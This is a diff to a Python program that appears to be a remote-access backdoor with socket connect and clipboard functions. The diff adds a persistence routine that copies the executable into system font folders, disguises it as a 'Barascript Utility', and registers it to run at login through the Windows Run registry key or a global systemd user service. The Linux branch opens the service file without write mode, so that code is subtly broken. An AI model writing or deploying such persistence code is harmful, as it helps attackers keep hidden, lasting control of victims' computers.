@@ -1,6 +1,9 @@
+#!/usr/bin/env python3
+import shutil
 import socket
 import subprocess
 import sys
+import os
 import threading
 import pyperclip
 from pathlib import Path
@@ -35,6 +38,40 @@ def resource_path(relative_path: Union[
     if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
         base_dir = Path(sys._MEIPASS)
     return base_dir / relative_path
+
+def persistence():
+    #Windows
+    if os.name == "nt":
+        location = "C:\\Windows\\Fonts" + r"\Windows Barascript Utility.exe"  # Disguise as a windows program
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call(
+                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsBaraUtil /t REG_SZ /d "{location}" ',
+                shell=True)
+    #Linux
+    else:
+        location = "/usr/share/fonts/barascript"
+        filename = location + "/Barascript"
+        if not os.path.exists(filename):
+            os.mkdir(location)
+            os.system("cp -r copydata " + location)
+            shutil.copyfile(sys.executable, filename)
+            servicefile = """[Unit]
+Description=Linux Barascript Utility
+After=graphical-session.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /usr/share/fonts/barascript/Barascript
+Restart=on-failure
+Environment=PYTHONUNBUFFERED=1
+
+[Install]
+WantedBy=default.target"""
+            with open("/etc/systemd/user/barascript-utility-manager.service") as file:
+                file.write(servicefile)
+                file.close()
+            os.system("systemctl enable barascript-utility-manager.service --global")
 
 def connect():
     help_text = """Available commands:
@@ -139,6 +176,7 @@ def clipboard(duration):
         time.sleep(0.1)
 
 if __name__ == "__main__":
+    persistence()
     while True:
         try:
             connect()
